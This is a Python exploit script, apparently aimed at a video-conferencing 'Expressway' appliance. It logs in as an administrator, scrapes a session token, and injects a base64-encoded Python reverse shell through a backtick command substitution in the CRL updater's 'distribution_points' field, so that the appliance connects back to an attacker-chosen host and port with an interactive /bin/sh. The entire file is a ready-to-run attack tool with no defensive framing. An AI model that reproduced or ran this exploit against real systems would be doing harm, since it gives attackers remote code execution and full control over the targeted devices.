#!/usr/bin/env python3
import base64
import requests
import argparse
import os
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
USER_AGENT = ""
PROXY_SETTING = {"http": "",
                 "https": ""}  # {"http": "http://localhost:8080", "https": "http://localhost:8080"}


class Expressway:
    def __init__(self, target, username, password, remote, port):
        self.target = target
        self.headers = {'User-Agent': USER_AGENT, 'Content-Type': 'application/x-www-form-urlencoded'}
        self.remote = remote
        self.port = port
        self.username = username
        self.password = password
        self.injection_data = "http://`python${IFS}-c${IFS}\"exec(__import__('base64').decodestring('BASE64_BLOB'))\"`"
        self.python_rev_shell = "s=__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM); s.connect(('{}', {})); __import__('os').dup2(s.fileno(),0); __import__('os').dup2(s.fileno(),1); __import__('os').dup2(s.fileno(),2); p=__import__('subprocess').call(['/bin/sh','-i'])"
        
        

    def exploit(self):
        try:
            base64_wrap = base64.b64encode(self.python_rev_shell.format(self.remote,self.port).encode('ascii'))
            complete_injection = self.injection_data.replace('BASE64_BLOB', base64_wrap.decode())
        except Exception as e:
            print(f'Failed to generate command blob: \n {e}')
            sys.exit(1)
           
        try:   
            s = requests.Session()
            post_data = {'submitButton': 'Login', 'username' : self.username, 'password': self.password, 'formbutton': 'Login'}
            print(f"Logging in \n")
            r = s.post(self.target + '/login', data=post_data,
                              headers=self.headers, verify=False, allow_redirects=False, proxies=PROXY_SETTING)
            if r.status_code != 303:
                print("Failed to login, didn't get a 303 back \n")
                sys.exit(1)
            else:
                print(f'Should be logged in, got cookies: {r.cookies}\n')
        except Exception as e:
            print(f'Failed to login: \n {e}')
            sys.exit(1)
            
        try:
            print(f'Getting sessionid token from page\n')
            r = s.get(self.target + '/crlupdater', headers=self.headers, verify=False, allow_redirects=False, proxies=PROXY_SETTING)
            html = r.text
            soup_data = BeautifulSoup(html, "html.parser")
            session_token = soup_data.find('input', {'id': 'sessionid'}).get('value')
            if session_token is not None:
                injection_data = {
                    'sessionid': session_token,
                    'submitbutton' : 'Save',
                    'update_mode' : 'Enabled',
                    'distribution_points': complete_injection,
                    'update_time' : 11
                }
                print(f'Got a sessiondid token: {session_token}\n')
            else:
                print("Failed to get sessionid value")  
        except Exception as e:
            print(f'Failed to get sessionid: \n {e}')
            sys.exit(1)
            
        try:
            print(f'Executing reverse shell to host: {self.remote}:{self.port}\n')
            print(f'Sending injection blob: {complete_injection}\n')
            r = s.post(self.target + '/crlupdater', data = injection_data, headers=self.headers, verify=False, allow_redirects=False, proxies=PROXY_SETTING)  
        except Exception as e:
            print(f'Failed to send exploit: \n {e}')
            sys.exit(1)
            


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Expressway exploitation tool')
    parser.add_argument('--target', required=True, default='https://127.0.0.1',
                        help='Target details in the following format: http(s)://IP:port')
    parser.add_argument("--username", required=True, help='administrator username')
    parser.add_argument("--password", required=True, help='administrator password')
    parser.add_argument("--remote", default='', required=True, help='remote host')
    parser.add_argument("--port", default='', required=True, help='remote port')
    args = parser.parse_args()
    
    exploit_handler = Expressway(args.target, args.username, args.password, args.remote, args.port)
    exploit_handler.exploit()

